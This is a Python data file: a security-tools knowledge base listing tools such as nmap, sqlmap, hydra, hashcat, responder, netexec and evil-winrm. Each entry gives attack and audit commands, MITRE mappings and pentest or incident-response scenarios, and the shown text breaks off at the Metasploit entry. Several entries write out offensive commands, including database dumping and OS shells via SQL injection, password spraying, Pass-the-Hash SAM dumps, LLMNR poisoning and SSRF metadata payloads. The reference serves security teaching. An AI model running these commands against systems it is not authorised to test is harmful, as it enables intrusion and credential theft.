"""
CyberPulse Cybersecurity Tools Knowledge Base
Contains rich metadata for 100+ premier security tools, MITRE ATT&CK mappings,
syntax cheatsheets, real-world incident scenarios, and learning references.
"""

CURATED_TOOLS = [
    # 1. NETWORK RECON & SCANNING
    {
        "name": "nmap",
        "display_name": "Nmap (Network Mapper)",
        "category": "Information Gathering",
        "subcategory": "Network Scanner",
        "description": "Industry-standard open-source network discovery and vulnerability scanner. Audits host availability, open ports, operating system detection, and service/version fingerprinting via NSE (Nmap Scripting Engine).",
        "package_name": "nmap",
        "binary_names": ["nmap"],
        "install_command": "sudo apt install nmap",
        "mitre_tactics": ["Reconnaissance", "Discovery"],
        "mitre_techniques": ["T1046 - Network Service Discovery", "T1595 - Active Scanning"],
        "syntax_examples": [
            {"cmd": "nmap -sC -sV -p- -oA full_scan 192.168.1.100", "desc": "Aggressive scan with default scripts, version detection, and all 65535 ports."},
            {"cmd": "nmap -sn 192.168.1.0/24", "desc": "Ping sweep for live hosts in a /24 subnet without port scanning."},
            {"cmd": "nmap --script vuln -p 80,443,445 10.10.10.5", "desc": "Audit common services for known CVE vulnerabilities using NSE scripts."}
        ],
        "scenarios": [
            {
                "title": "Initial External & Internal Network Reconnaissance",
                "incident_type": "Penetration Testing / Attack Surface Discovery",
                "description": "Target organization has exposed IP blocks. Need to map all listening TCP/UDP daemons, filter firewalls, and detect outdated services vulnerable to initial access.",
                "steps": [
                    "Perform fast discovery sweep: nmap -sn -T4 10.0.0.0/24",
                    "Scan detected hosts with top 1000 ports: nmap -sS -sV 10.0.0.15",
                    "Run service banner & NSE vulnerability scripts on open ports: nmap -sC -sV -p 80,445,3389 10.0.0.15"
                ]
            },
            {
                "title": "Rogue Device Detection & Asset Inventory Verification",
                "incident_type": "Defensive Audit / IT SecOps",
                "description": "SOC alerts on unexpected MAC addresses on the internal management VLAN. Scan to fingerprint OS and open management protocols.",
                "steps": [
                    "Execute SYN scan with OS fingerprinting: sudo nmap -O 192.168.20.0/24",
                    "Compare discovered open ports (SSH, Telnet, HTTP) against CMDB inventory."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Nmap Official Reference Guide", "url": "https://nmap.org/book/man.html", "type": "doc"},
            {"title": "Kali Nmap Documentation", "url": "https://www.kali.org/tools/nmap/", "type": "doc"},
            {"title": "TryHackMe: Nmap In Depth", "url": "https://tryhackme.com/room/furthernmap", "type": "lab"}
        ]
    },
    {
        "name": "masscan",
        "display_name": "Masscan (Mass IP Port Scanner)",
        "category": "Information Gathering",
        "subcategory": "Asynchronous High-Speed Scanner",
        "description": "Fastest Internet port scanner capable of scanning the entire Internet in under 5 minutes using asynchronous packet transmission, similar to scanrand and unicornscan.",
        "package_name": "masscan",
        "binary_names": ["masscan"],
        "install_command": "sudo apt install masscan",
        "mitre_tactics": ["Reconnaissance", "Discovery"],
        "mitre_techniques": ["T1046 - Network Service Discovery"],
        "syntax_examples": [
            {"cmd": "sudo masscan 10.0.0.0/16 -p80,443,8080 --rate=10000", "desc": "Scan a /16 range for web ports at 10,000 packets/sec."},
            {"cmd": "sudo masscan -p1-65535 192.168.1.50 --rate=1000 -oL results.txt", "desc": "Fast all-port scan on target IP saved to list output."}
        ],
        "scenarios": [
            {
                "title": "Large-Scale External Perimeter Port Sweep",
                "incident_type": "Red Team / Attack Surface Management",
                "description": "Client has multiple /20 network blocks. Standard scanners take days; masscan finds all open ports within minutes for targeted follow-up.",
                "steps": [
                    "Run masscan across entire IP range: sudo masscan 198.51.100.0/22 -p1-65535 --rate=5000 -oL open_ports.txt",
                    "Feed discovered ports directly to nmap for service fingerprinting."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Masscan GitHub Repository", "url": "https://github.com/robertdavidgraham/masscan", "type": "doc"},
            {"title": "Kali Masscan Overview", "url": "https://www.kali.org/tools/masscan/", "type": "doc"}
        ]
    },

    # 2. WEB APPLICATION SECURITY
    {
        "name": "burpsuite",
        "display_name": "Burp Suite",
        "category": "Web Applications",
        "subcategory": "HTTP Interception Proxy & Vulnerability Scanner",
        "description": "Leading web application security testing platform. Features an intercepting proxy, Repeater for manual request crafting, Intruder for automated fuzzing, Comparer, Decoder, and extensibility via BApp Store.",
        "package_name": "burpsuite",
        "binary_names": ["burpsuite", "burpsuite_pro"],
        "install_command": "sudo apt install burpsuite",
        "mitre_tactics": ["Initial Access", "Discovery"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application"],
        "syntax_examples": [
            {"cmd": "burpsuite &", "desc": "Launch Burp Suite GUI and start local proxy on 127.0.0.1:8080."},
            {"cmd": "curl -x http://127.0.0.1:8080 -k https://target.com", "desc": "Route CLI HTTP traffic directly through Burp proxy for inspection."}
        ],
        "scenarios": [
            {
                "title": "API Authentication Bypass & Broken Object Level Authorization (BOLA/IDOR)",
                "incident_type": "Web Application Penetration Test",
                "description": "Testing a REST/GraphQL API for user impersonation and horizontal authorization flaws by tampering with user IDs in requests.",
                "steps": [
                    "Configure browser proxy to 127.0.0.1:8080 and import Burp CA certificate.",
                    "Capture legitimate request: GET /api/v1/user/1042/profile.",
                    "Send to Repeater (Ctrl+R), alter ID to 1043, and inspect unauthorized data leakage.",
                    "Automate fuzzing of user ID ranges using Burp Intruder."
                ]
            },
            {
                "title": "Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction",
                "incident_type": "Cloud / Web Vulnerability Assessment",
                "description": "Web webhook parameter accepts arbitrary URLs; test if backend queries internal cloud metadata at http://169.254.169.254.",
                "steps": [
                    "Intercept outbound POST request in Burp Proxy.",
                    "Use Burp Collaborator to verify blind out-of-band DNS/HTTP interactions.",
                    "Craft internal loopback payloads: http://127.0.0.1:80/admin and http://169.254.169.254/latest/meta-data/."
                ]
            }
        ],
        "learning_refs": [
            {"title": "PortSwigger Web Security Academy", "url": "https://portswigger.net/web-security", "type": "lab"},
            {"title": "Burp Suite Official Docs", "url": "https://portswigger.net/burp/documentation", "type": "doc"}
        ]
    },
    {
        "name": "sqlmap",
        "display_name": "SQLMap (Automatic SQL Injection Tool)",
        "category": "Web Applications",
        "subcategory": "Database Exploitation",
        "description": "Powerful automatic SQL injection and database takeover tool. Detects and exploits Boolean-based blind, Time-based blind, Error-based, UNION query, and stacked query injections across all major DBMSs.",
        "package_name": "sqlmap",
        "binary_names": ["sqlmap"],
        "install_command": "sudo apt install sqlmap",
        "mitre_tactics": ["Initial Access", "Credential Access", "Collection"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1005 - Data from Local System"],
        "syntax_examples": [
            {"cmd": "sqlmap -u 'http://target.com/item.php?id=1' --batch --dbs", "desc": "Automatically test parameter and enumerate all databases."},
            {"cmd": "sqlmap -r request.txt -p username --level=3 --risk=2 --current-db", "desc": "Parse raw HTTP request saved from Burp and target specific parameter."},
            {"cmd": "sqlmap -u 'http://target.com/page.php?id=1' -D appdb -T users --dump", "desc": "Dump rows from the 'users' table in database 'appdb'."},
            {"cmd": "sqlmap -u 'http://target.com/admin.php?id=1' --os-shell", "desc": "Attempt interactive operating system shell via database privileges."}
        ],
        "scenarios": [
            {
                "title": "E-Commerce Database Triage & Data Breach Verification",
                "incident_type": "Vulnerability Assessment / Incident Verification",
                "description": "Bug bounty report claims SQL injection on product search. Need to verify whether vulnerable parameter allows schema enumeration or database compromise.",
                "steps": [
                    "Save intercepted search POST request from Burp into search.req.",
                    "Run sqlmap: sqlmap -r search.req -p search_query --dbs --batch",
                    "Confirm vulnerability and document exact database version, schema names, and remediate using prepared statements."
                ]
            }
        ],
        "learning_refs": [
            {"title": "SQLMap User's Manual", "url": "https://github.com/sqlmapproject/sqlmap/wiki", "type": "doc"},
            {"title": "PortSwigger SQL Injection Guide", "url": "https://portswigger.net/web-security/sql-injection", "type": "lab"}
        ]
    },
    {
        "name": "ffuf",
        "display_name": "FFuF (Fast Web Fuzzer)",
        "category": "Web Applications",
        "subcategory": "Directory & Parameter Fuzzer",
        "description": "Ultra-fast web fuzzer written in Go. Used for discovering hidden endpoints, files, vhosts, API routes, and parameter fuzzing with flexible filtering options.",
        "package_name": "ffuf",
        "binary_names": ["ffuf"],
        "install_command": "sudo apt install ffuf",
        "mitre_tactics": ["Discovery", "Reconnaissance"],
        "mitre_techniques": ["T1595.003 - Wordlist Scanning", "T1083 - File and Directory Discovery"],
        "syntax_examples": [
            {"cmd": "ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302", "desc": "Fuzz web directories with common wordlist filtering by HTTP status."},
            {"cmd": "ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.txt,.bak", "desc": "Fuzz directories with file extensions."},
            {"cmd": "ffuf -u http://target.com/api/v1/user?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 120", "desc": "Discover hidden GET parameters by filtering response size 120."}
        ],
        "scenarios": [
            {
                "title": "Hidden Admin Portal & Backup File Discovery",
                "incident_type": "Penetration Testing / Web Recon",
                "description": "Application shows minimal public attack surface. Need to check for leaked config files, .env files, backup databases, or unlinked admin dashboards.",
                "steps": [
                    "Run directory fuzzing: ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,403",
                    "Fuzz Virtual Hosts: ffuf -u https://example.com -H 'Host: FUZZ.example.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 420"
                ]
            }
        ],
        "learning_refs": [
            {"title": "FFuF GitHub & Cheatsheet", "url": "https://github.com/ffuf/ffuf", "type": "doc"},
            {"title": "Kali FFuF Tool Overview", "url": "https://www.kali.org/tools/ffuf/", "type": "doc"}
        ]
    },
    {
        "name": "gobuster",
        "display_name": "Gobuster",
        "category": "Web Applications",
        "subcategory": "Directory / DNS / VHost Brute-forcer",
        "description": "High-performance directory and DNS subdomain brute-forcing tool written in Go. Supports dir, dns, vhost, fuzz, and tftp modes.",
        "package_name": "gobuster",
        "binary_names": ["gobuster"],
        "install_command": "sudo apt install gobuster",
        "mitre_tactics": ["Discovery", "Reconnaissance"],
        "mitre_techniques": ["T1083 - File and Directory Discovery"],
        "syntax_examples": [
            {"cmd": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50", "desc": "Brute-force directories with 50 threads."},
            {"cmd": "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "desc": "Brute-force subdomains for target domain."}
        ],
        "scenarios": [
            {
                "title": "Subdomain Enumeration in CTF / Penetration Test",
                "incident_type": "Reconnaissance",
                "description": "Target organization hosts web applications on subdomains not registered in public DNS.",
                "steps": [
                    "Run gobuster dns: gobuster dns -d corp.local -w /usr/share/seclists/Discovery/DNS/namelist.txt",
                    "Run vhost mode to catch virtual host routing: gobuster vhost -u http://corp.local -w vhosts.txt"
                ]
            }
        ],
        "learning_refs": [
            {"title": "Gobuster GitHub Guide", "url": "https://github.com/OJ/gobuster", "type": "doc"}
        ]
    },
    {
        "name": "nikto",
        "display_name": "Nikto Web Server Scanner",
        "category": "Web Applications",
        "subcategory": "Web Vulnerability Scanner",
        "description": "Open-source web server scanner that tests web servers for dangerous files, outdated server software, configuration items such as presence of multiple index files, HTTP server options, and known server vulnerabilities.",
        "package_name": "nikto",
        "binary_names": ["nikto"],
        "install_command": "sudo apt install nikto",
        "mitre_tactics": ["Discovery", "Reconnaissance"],
        "mitre_techniques": ["T1595 - Active Scanning"],
        "syntax_examples": [
            {"cmd": "nikto -h http://192.168.1.50", "desc": "Standard web server configuration audit."},
            {"cmd": "nikto -h https://target.com -ssl -C all -o nikto_report.html -F html", "desc": "Scan HTTPS endpoint and output detailed HTML report."}
        ],
        "scenarios": [
            {
                "title": "Web Server Baseline Hardening Audit",
                "incident_type": "Compliance & Security Hardening",
                "description": "SOC requires verification of HTTP security headers (HSTS, CSP, X-Frame-Options) and check for exposed /server-status or phpinfo pages.",
                "steps": [
                    "Run scan: nikto -h https://internal.company.com -ssl",
                    "Review findings for outdated Apache/Nginx modules and missing security headers."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Nikto Official Website", "url": "https://cirt.net/Nikto2", "type": "doc"}
        ]
    },
    {
        "name": "wpscan",
        "display_name": "WPScan (WordPress Security Scanner)",
        "category": "Web Applications",
        "subcategory": "CMS Vulnerability Scanner",
        "description": "Black box WordPress vulnerability scanner. Detects core WordPress vulnerabilities, insecure plugins, vulnerable themes, user accounts, and timthumbs.",
        "package_name": "wpscan",
        "binary_names": ["wpscan"],
        "install_command": "sudo apt install wpscan",
        "mitre_tactics": ["Initial Access", "Discovery"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application"],
        "syntax_examples": [
            {"cmd": "wpscan --url https://blog.target.com --enumerate u,vp,vt", "desc": "Enumerate users, vulnerable plugins, and vulnerable themes."},
            {"cmd": "wpscan --url https://target.com -U admin -P /usr/share/wordlists/rockyou.txt", "desc": "Password brute force against WordPress admin login."}
        ],
        "scenarios": [
            {
                "title": "WordPress Compromise Investigation",
                "incident_type": "Web Incident Response",
                "description": "Corporate blog was defaced. Need to identify which plugin or theme contained the remote code execution or file upload vulnerability.",
                "steps": [
                    "Run wpscan: wpscan --url https://blog.company.com --enumerate vp,vt --plugins-detection aggressive",
                    "Cross-reference detected plugin versions with known CVEs."
                ]
            }
        ],
        "learning_refs": [
            {"title": "WPScan Documentation", "url": "https://wpscan.com/", "type": "doc"}
        ]
    },

    # 3. PASSWORD & CREDENTIAL ATTACKS
    {
        "name": "hydra",
        "display_name": "THC Hydra",
        "category": "Password Attacks",
        "subcategory": "Network Login Brute-Forcer",
        "description": "Parallelized network login cracker supporting over 50 protocols including SSH, FTP, Telnet, RDP, SMB, HTTP-POST/GET, MySQL, PostgreSQL, VNC, and LDAP.",
        "package_name": "hydra",
        "binary_names": ["hydra", "xhydra"],
        "install_command": "sudo apt install hydra",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110 - Brute Force", "T1110.001 - Password Guessing"],
        "syntax_examples": [
            {"cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4", "desc": "Brute force SSH root login using rockyou wordlist with 4 threads."},
            {"cmd": "hydra -L users.txt -P passwords.txt 10.0.0.15 smb", "desc": "Audit SMB credentials across multiple user accounts."},
            {"cmd": "hydra -l admin -P pass.txt 10.10.10.10 http-post-form '/login.php:user=^USER^&pass=^PASS^:F=Login failed'", "desc": "Brute-force HTTP POST web login form."}
        ],
        "scenarios": [
            {
                "title": "Weak Credential Audit across Enterprise SSH Servers",
                "incident_type": "Internal Penetration Test / Hardening",
                "description": "Audit default or common passwords across network appliances and Linux bastion hosts.",
                "steps": [
                    "Prepare list of admin accounts and top 100 enterprise passwords.",
                    "Execute hydra: hydra -L accounts.txt -P top100.txt -M targets.txt ssh -t 4 -f",
                    "Report compromised accounts for immediate password reset and MFA enforcement."
                ]
            }
        ],
        "learning_refs": [
            {"title": "THC Hydra GitHub", "url": "https://github.com/vanhauser-thc/thc-hydra", "type": "doc"},
            {"title": "Kali Hydra Manual", "url": "https://www.kali.org/tools/hydra/", "type": "doc"}
        ]
    },
    {
        "name": "john",
        "display_name": "John the Ripper (JtR)",
        "category": "Password Attacks",
        "subcategory": "Offline Password Cracker",
        "description": "Legendary fast password cracker designed for auditing Unix crypt, MD5, SHA-256, SHA-512, NTLM, Kerberos, zip, pdf, and hundreds of proprietary hash formats using wordlist and rule-based modes.",
        "package_name": "john",
        "binary_names": ["john"],
        "install_command": "sudo apt install john",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110.002 - Password Cracking"],
        "syntax_examples": [
            {"cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt", "desc": "Crack hashes using RockYou wordlist and hybrid mangling rules."},
            {"cmd": "zip2john protected.zip > zip.hash && john --wordlist=rockyou.txt zip.hash", "desc": "Extract encrypted ZIP hash and crack its password."},
            {"cmd": "john --format=NT --wordlist=pass.txt ntds_hashes.txt", "desc": "Crack Windows Active Directory NTLM password hashes."},
            {"cmd": "john --show hashes.txt", "desc": "Display all previously cracked passwords."}
        ],
        "scenarios": [
            {
                "title": "Ransomware Investigation / Password-Protected Archive Decryption",
                "incident_type": "Digital Forensics & Incident Response",
                "description": "Incident responders recover a password-protected zip left by threat actors containing stolen exfiltration data.",
                "steps": [
                    "Extract archive password hash: zip2john evidence.zip > archive.hash",
                    "Audit hash using John with custom rule-sets: john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo archive.hash",
                    "Inspect cracked password using: john --show archive.hash"
                ]
            }
        ],
        "learning_refs": [
            {"title": "John the Ripper Documentation", "url": "https://www.openwall.com/john/doc/", "type": "doc"},
            {"title": "Kali John the Ripper Tool Page", "url": "https://www.kali.org/tools/john/", "type": "doc"}
        ]
    },
    {
        "name": "hashcat",
        "display_name": "Hashcat (Advanced Password Recovery)",
        "category": "Password Attacks",
        "subcategory": "GPU-Accelerated Password Cracker",
        "description": "The world's fastest and most advanced password recovery utility, leveraging GPU/OpenCL parallelism. Supports over 300 hash types including NTLM, Kerberos, WPA/WPA2, BitLocker, LUKS, KeePass, and Argon2.",
        "package_name": "hashcat",
        "binary_names": ["hashcat"],
        "install_command": "sudo apt install hashcat",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110.002 - Password Cracking"],
        "syntax_examples": [
            {"cmd": "hashcat -m 1000 -a 0 ntlm.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "desc": "Crack NTLM hashes (-m 1000) with dictionary attack and best64 rules."},
            {"cmd": "hashcat -m 22000 wpa.hc22000 /usr/share/wordlists/rockyou.txt", "desc": "Crack WPA/WPA2 PMKID / 4-way handshake (-m 22000)."},
            {"cmd": "hashcat -m 13100 kerberoast.hashes rockyou.txt", "desc": "Crack Kerberos 5 TGS-REP etype 23 hashes from Kerberoasting."}
        ],
        "scenarios": [
            {
                "title": "Active Directory Kerberoasting Attack Crack",
                "incident_type": "Active Directory Red Team / Audit",
                "description": "TGS tickets requested for SPNs of service accounts. Hashes must be cracked offline to obtain plaintext service account passwords.",
                "steps": [
                    "Extract TGS tickets using impacket-GetUserSPNs.",
                    "Run Hashcat mode 13100: hashcat -m 13100 -a 0 spns.hash rockyou.txt -o cracked_spns.txt",
                    "Identify compromised high-privilege service accounts (e.g., MSSQL service running as Domain Admin)."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Hashcat Wiki & Hash Types", "url": "https://hashcat.net/wiki/", "type": "doc"},
            {"title": "Kali Hashcat Page", "url": "https://www.kali.org/tools/hashcat/", "type": "doc"}
        ]
    },

    # 4. ACTIVE DIRECTORY & POST-EXPLOITATION
    {
        "name": "responder",
        "display_name": "Responder (LLMNR / NBT-NS Poisoner)",
        "category": "Sniffing & Spoofing",
        "subcategory": "Active Directory Credential Harvester",
        "description": "LLMNR, NBT-NS, and MDNS poisoner. Answers multicast name resolution queries to bait internal Windows machines into sending NetNTLMv1/v2 credential hashes or relaying SMB/HTTP authentications.",
        "package_name": "responder",
        "binary_names": ["responder", "Responder"],
        "install_command": "sudo apt install responder",
        "mitre_tactics": ["Credential Access", "Collection"],
        "mitre_techniques": ["T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay"],
        "syntax_examples": [
            {"cmd": "sudo responder -I eth0 -dwv", "desc": "Start Responder on eth0 listening for queries, capturing NetNTLM hashes with verbose logs."},
            {"cmd": "sudo responder -I eth0 -F --lm", "desc": "Force NTLM downgrade and capture LM hashes."}
        ],
        "scenarios": [
            {
                "title": "Internal Windows Network Assessment & Initial Hash Harvesting",
                "incident_type": "Internal Red Team / Rogue Protocol Detection",
                "description": "Connected to internal office LAN with zero domain credentials. Exploit broadcast name resolution misconfigurations to capture domain user NetNTLMv2 hashes.",
                "steps": [
                    "Identify active network interface: ip a",
                    "Launch Responder: sudo responder -I eth0 -d -w -r",
                    "When Windows machines mistype a file share (e.g. \\printr instead of \\printer), Responder poisons response and captures hash in /usr/share/responder/logs/",
                    "Crack hashes using Hashcat (-m 5600) or relay with ntlmrelayx."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Responder GitHub", "url": "https://github.com/SpiderLabs/Responder", "type": "doc"},
            {"title": "TryHackMe: Active Directory Basics", "url": "https://tryhackme.com/room/activedirectorybasics", "type": "lab"}
        ]
    },
    {
        "name": "netexec",
        "display_name": "NetExec (nxc / successor to CrackMapExec)",
        "category": "Active Directory & Post-Exploitation",
        "subcategory": "Network Protocol Swiss Army Knife",
        "description": "Post-exploitation tool that automates assessing the security of large Active Directory networks. Interacts with SMB, WMI, WinRM, LDAP, MSSQL, RDP, VNC, and FTP.",
        "package_name": "netexec",
        "binary_names": ["netexec", "nxc", "crackmapexec"],
        "install_command": "sudo apt install netexec",
        "mitre_tactics": ["Discovery", "Lateral Movement", "Credential Access"],
        "mitre_techniques": ["T1087 - Account Discovery", "T1021.002 - SMB/Windows Admin Shares"],
        "syntax_examples": [
            {"cmd": "nxc smb 192.168.1.0/24", "desc": "Enumerate SMB signing, domain name, and Windows OS versions across subnet."},
            {"cmd": "nxc smb 192.168.1.50 -u 'Administrator' -p 'Pass123' --shares", "desc": "Validate credentials and enumerate readable/writable SMB shares."},
            {"cmd": "nxc smb 192.168.1.50 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --sam", "desc": "Perform Pass-the-Hash and dump local SAM database."},
            {"cmd": "nxc winrm 192.168.1.0/24 -u 'users.txt' -p 'Summer2024!' --continue-on-success", "desc": "Password spray across WinRM endpoints."}
        ],
        "scenarios": [
            {
                "title": "Domain Password Spray & Local Administrator Privilege Hunting",
                "incident_type": "Active Directory Penetration Test",
                "description": "Testing enterprise password policies by spraying a single seasonal password across all domain users without locking accounts.",
                "steps": [
                    "Spray password: nxc smb 10.10.10.100 -u domain_users.txt -p 'Autumn2024!'",
                    "For valid logins, check Pwn3d! status (Local Admin rights): nxc smb targets.txt -u valid_user -p 'Autumn2024!'",
                    "Dump LSA secrets or SAM hashes on owned endpoints."
                ]
            }
        ],
        "learning_refs": [
            {"title": "NetExec Official Documentation", "url": "https://www.netexec.org/", "type": "doc"}
        ]
    },
    {
        "name": "bloodhound",
        "display_name": "BloodHound",
        "category": "Active Directory & Post-Exploitation",
        "subcategory": "Active Directory Graph Analyzer",
        "description": "Visualizes Active Directory and Azure/Entra ID attack paths using graph theory. Identifies hidden relationship chains, misconfigured ACLs, unconstrained delegation, and escalation routes to Domain Admin.",
        "package_name": "bloodhound",
        "binary_names": ["bloodhound", "bloodhound-python"],
        "install_command": "sudo apt install bloodhound",
        "mitre_tactics": ["Discovery", "Privilege Escalation"],
        "mitre_techniques": ["T1069 - Permission Groups Discovery", "T1078 - Valid Accounts"],
        "syntax_examples": [
            {"cmd": "bloodhound-python -u 'john' -p 'P@ssword' -d corp.local -dc dc01.corp.local -c All", "desc": "Collect all Active Directory objects, trusts, and ACL permissions from domain controller."},
            {"cmd": "bloodhound &", "desc": "Launch BloodHound GUI interface to query Neo4j database."}
        ],
        "scenarios": [
            {
                "title": "Mapping Shortest Path to Domain Admin",
                "incident_type": "Active Directory Security Architecture Review",
                "description": "Standard domain account compromised. Need to find non-obvious ACL misconfigurations (GenericAll, WriteDacl, ForceChangePassword) leading to Domain dominance.",
                "steps": [
                    "Collect graph data: bloodhound-python -u user -p pass -d company.com -ns 10.0.0.1 -c All",
                    "Import generated JSON files into BloodHound GUI.",
                    "Run built-in query: 'Find Shortest Paths to Domain Admins from Owned Principals'.",
                    "Execute identified path (e.g. Reset password of service account that has GenericAll on Domain Controller)."
                ]
            }
        ],
        "learning_refs": [
            {"title": "BloodHound Official Docs", "url": "https://bloodhound.readthedocs.io/", "type": "doc"},
            {"title": "SpecterOps BloodHound Whitepapers", "url": "https://posts.specterops.io/", "type": "doc"}
        ]
    },
    {
        "name": "evil-winrm",
        "display_name": "Evil-WinRM",
        "category": "Active Directory & Post-Exploitation",
        "subcategory": "Windows Remote Management Shell",
        "description": "The ultimate WinRM shell for hacking/pentesting Windows machines. Supports interactive PowerShell execution, Pass-the-Hash, in-memory script execution, binary execution, and file transfer.",
        "package_name": "evil-winrm",
        "binary_names": ["evil-winrm"],
        "install_command": "sudo apt install evil-winrm",
        "mitre_tactics": ["Execution", "Lateral Movement"],
        "mitre_techniques": ["T1021.006 - Windows Remote Management"],
        "syntax_examples": [
            {"cmd": "evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'", "desc": "Connect to remote host via WinRM with username and password."},
            {"cmd": "evil-winrm -i 192.168.1.100 -u Administrator -H 329153f560eb32958904539b50c5ef17", "desc": "Pass-the-Hash connection using NTLM hash without knowing plaintext password."},
            {"cmd": "evil-winrm -i 192.168.1.100 -u user -p pass -s /opt/privesc_scripts/", "desc": "Load local directory of PowerShell scripts directly into memory on remote host."}
        ],
        "scenarios": [
            {
                "title": "Remote Windows System Management & Lateral Movement",
                "incident_type": "Red Team / Lateral Movement",
                "description": "Discovered administrator NTLM hash via Responder/SAM dump on host A; use it to access host B via WinRM without plaintext password.",
                "steps": [
                    "Connect via Pass-the-Hash: evil-winrm -i 10.10.10.20 -u Administrator -H <HASH>",
                    "Transfer enumeration scripts directly into memory: upload /opt/winpeas.ps1",
                    "Execute script and triage privilege escalation vectors."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Evil-WinRM GitHub Guide", "url": "https://github.com/Hackplayers/evil-winrm", "type": "doc"}
        ]
    },

    # 5. PACKET SNIFFING & NETWORK ANALYSIS
    {
        "name": "wireshark",
        "display_name": "Wireshark",
        "category": "Sniffing & Spoofing",
        "subcategory": "Packet Analyzer & Protocol Inspector",
        "description": "World's foremost and widely-used network protocol analyzer. Lets you inspect what's happening on your network at a microscopic level with deep protocol dissection and live packet capture.",
        "package_name": "wireshark",
        "binary_names": ["wireshark", "tshark"],
        "install_command": "sudo apt install wireshark",
        "mitre_tactics": ["Collection", "Credential Access"],
        "mitre_techniques": ["T1040 - Network Sniffing"],
        "syntax_examples": [
            {"cmd": "wireshark &", "desc": "Launch Wireshark GUI."},
            {"cmd": "tshark -i eth0 -f 'tcp port 80' -Y 'http.request.method == POST' -T fields -e http.file_data", "desc": "CLI capture of HTTP POST body data on eth0."},
            {"cmd": "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name | sort | uniq -c", "desc": "Extract and count unique DNS queries from a pcap file."}
        ],
        "scenarios": [
            {
                "title": "Malware C2 Beaconing & Data Exfiltration Triage",
                "incident_type": "SOC Alert / Incident Response",
                "description": "EDR reports an endpoint generating periodic outbound connections. Analyze PCAP capture to extract TLS SNI names, DNS tunneling indicators, or plain HTTP C2 instructions.",
                "steps": [
                    "Open capture.pcap in Wireshark.",
                    "Filter suspicious TLS handshake domains: tls.handshake.type == 1",
                    "Check for DNS tunneling: dns.flags.response == 0 and dns.qry.name.len > 40",
                    "Follow TCP stream (Ctrl+Alt+Shift+T) to reconstruct raw payload conversation."
                ]
            },
            {
                "title": "Cleartext Credential Extraction from Legacy Protocols",
                "incident_type": "Network Penetration Testing",
                "description": "Legacy FTP, Telnet, or Basic HTTP Auth in use on internal network segments.",
                "steps": [
                    "Filter capture: ftp || telnet || http.authorization",
                    "Extract plaintext passwords transmitted across switch."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Wireshark User's Guide", "url": "https://www.wireshark.org/docs/", "type": "doc"},
            {"title": "TryHackMe: Wireshark 101", "url": "https://tryhackme.com/room/wireshark101", "type": "lab"}
        ]
    },
    {
        "name": "tcpdump",
        "display_name": "Tcpdump (Command-Line Packet Analyzer)",
        "category": "Sniffing & Spoofing",
        "subcategory": "Network Traffic Capture",
        "description": "Ubiquitous, lightweight command-line packet analyzer. Ideal for headless servers, containers, and live incident triage where graphical interfaces are unavailable.",
        "package_name": "tcpdump",
        "binary_names": ["tcpdump"],
        "install_command": "sudo apt install tcpdump",
        "mitre_tactics": ["Collection"],
        "mitre_techniques": ["T1040 - Network Sniffing"],
        "syntax_examples": [
            {"cmd": "sudo tcpdump -i eth0 -n -w incident.pcap", "desc": "Capture all packets on eth0 without DNS resolution and save to pcap file."},
            {"cmd": "sudo tcpdump -i any 'port 53 or port 443' -c 100", "desc": "Capture first 100 packets matching DNS or HTTPS across all interfaces."},
            {"cmd": "sudo tcpdump -A -i eth0 'tcp port 80'", "desc": "Print ASCII contents of HTTP traffic live in terminal."}
        ],
        "scenarios": [
            {
                "title": "Headless Server DDoS Attack Capture",
                "incident_type": "DDoS Mitigation & Traffic Triage",
                "description": "Linux production web server experiencing CPU exhaustion and network saturation. Rapidly capture packets for upstream scrubbing filter analysis.",
                "steps": [
                    "Capture 10,000 raw packets: sudo tcpdump -i eth0 -c 10000 -w /tmp/ddos_sample.pcap",
                    "Analyze top source IP addresses: tcpdump -nr /tmp/ddos_sample.pcap | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -nr | head -n 20",
                    "Formulate iptables or cloud firewall drop rules based on attacker signatures."
                ]
            }
        ],
        "learning_refs": [
            {"title": "Tcpdump Man Page & Guide", "url": "https://www.tcpdump.org/manpages/tcpdump.1.html", "type": "doc"}
        ]
    },

    # 6. EXPLOITATION FRAMEWORKS
    {
        "name": "metasploit",
        "display_name": "Metasploit Framework (msfconsole)",
        "category": "Exploitation Tools",
        "subcategory": "Exploit Development & Delivery Engine",
        "description": "The world's most widely used penetration testing framework. Provides thousands of exploit modules, auxiliary scanners, post-exploitation scripts, and payload generators (Meterpreter).",
        "package_name": "metasploit-framework",
        "binary_names": ["msfconsole", "msfvenom", "msfdb"],
        "install_command": "sudo apt install metasploit-framework",
